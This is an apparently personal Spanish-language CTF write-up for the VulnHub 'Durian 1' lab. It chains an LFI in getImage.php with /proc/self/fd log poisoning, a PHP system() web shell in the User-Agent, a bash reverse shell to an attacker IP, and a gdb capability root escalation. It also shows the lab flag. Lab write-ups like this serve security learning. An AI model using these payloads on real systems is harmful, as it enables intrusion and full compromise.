---
tags:
  - estado/completo
plataforma: "[[VulnHub]]"
web:
dificultad: Fácil
os: Linux
relacionados:
  - "[[gobuster]]"
  - "[[File Inclusion|LFI]]"
  - "[[Log Poisoning]]"
  - "[[Burpsuite]]"
  - "[[getcap]]"
---
#  VulnHub - Durian 1

## Reconocimiento

### Descubrimiento de la IP de la Máquina Víctima

**Comando (arp-scan):**
```bash
arp-scan -I [interfaz] --localnet
```

### Escaneo de Puertos con Nmap

#### Escaneo Rápido de Todos los Puertos Abiertos

**Comando (nmap):**
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP_Victima]
```

#### Reconocimiento y Versionado de Servicios en Puertos Abiertos

**Comando (nmap):**
```bash
nmap -sC -sV -p[puertos_encontrados] [IP_Victima] -oN nmap_scan_result.txt
```

### Enumeración de Contenido Web con Gobuster

**Comando (gobuster):**
```bash
gobuster dir -u http://[IP_Victima] -w [diccionario.txt] -t 20 --add-slash
```

### Análisis del Directorio Encontrado

**URL Exploración:**
```
http://[IP_Victima]/cgi-data
```

---

## Análisis de Vulnerabilidades

### Local File Inclusion (LFI)

#### Verificación Manual de Inclusión

**URL:**
```
http://[IP_Victima]/cgi-data/getImage.php?file=/etc/passwd
```

#### Uso de Curl para Filtrar Resultados

**Comando (curl):**
```bash
curl -s -X GET "http://[IP_Victima]/cgi-data/getImage.php?file=/etc/passwd" | grep "sh$"
```

#### Buscando en varias rutas

[[Rutas principales en un LFI]]

#### Revisando servicios

```bash
curl -s -X GET http://[IP_victima]/cgi-data/getImage.php\?file\=/proc/sched_debug
```

#### Revisando puertos 

**/proc/net/tcp:**
```bash
curl -s -X GET http://[IP_victima]/cgi-data/getImage.php\?file\=/proc/net/tcp  
```

**Filtrando la información y convirtiendo puertos de [[Hexadecimal a Decimal]]:**
```bash
for port in $(curl -s -X GET http://[IP_victima]/cgi-data/getImage.php\?file\=/proc/net/tcp | tail -n 6 | awk {'print $2'} | awk -F: {'print $2'}); do echo "[+] Puerto $port -> $(echo "obase=10; ibase=16; $port" | bc)"; done | sort -n -k 5
```
o
```bash
for port in $(curl -s -X GET http://[IP_victima]/cgi-data/getImage.php\?file\=/proc/net/tcp | tail -n 6 | awk {'print $2'} | awk -F: {'print $2'}); do echo "[+] Puerto $port -> $((16#$port))"; done | sort -n -k 5
```

Aunque no se puedan ver los logs directamente, es posible verlos desde otras rutas, como es el caso de [[proc self fd|/proc/self/fd]]

### Exploración con Burp Suite

#### Captura de Solicitud con Proxy Activo

- Activar FoxyProxy en el navegador y capturar la solicitud:
```
/cgi-data/getImage.php
```

#### Análisis con Repeater e Intruder

1. Enviar la solicitud capturada al Repeater (`Ctrl + R`) y modificar la ruta:
```
cgi-data/getImage.php?file=/proc/self/fd/0
```

2. Enviar al Intruder (`Ctrl + I`), seleccionar el tipo de ataque **Sniper**, agregar el parámetro `0` de la ruta y configurar los **Payloads**:
    - **Payload Type:** Numbers
    - **Options:**
        - **From:** 1
        - **To:** 30
        - **Step:** 1

#### Identificación de Respuestas Diferentes

- Analizar las respuestas en el log.
- Enviar las respuestas al Repeater y reemplazar el **User-Agent** por el siguiente payload:

```php
<?php system($_GET['cmd']); ?>
```

---

## Explotación de Vulnerabilidades

### Ejecución de Comandos y Shell Reverse

#### Verificación de Comando `id`

**URL:**
```
view-source:http://[IP_Victima]/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=id
```

#### Configuración de Shell Reverse

1. **Escucha con Netcat (nc):**
    ```bash
    nc -nlvp 443
    ```
    
2. **Ejecución de Shell Reverse:** **URL Modificada:**
    ```
    view-source:http://[IP_Victima]/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=bash -c "bash -i >& /dev/tcp/[IP_Atacante]/443 0>&1"
    ```
    

### Consola Interactiva TTY

**Comandos:**
```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset
export TERM=xterm
```

---

## Escalada de Privilegios

### Búsqueda de Capacidades Especiales

**Comando (getcap):**
```bash
getcap -r / 2>/dev/null
```

### Escalada de Privilegios con GDB

**Comando (gdb):**
```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

### Verificación de Privilegios Root

**Comandos:**
```bash
whoami
cat /root/proof.txt
```

___

## Bandera(s)

> [!flag] `flag{B4nd3r4}`
^bandera
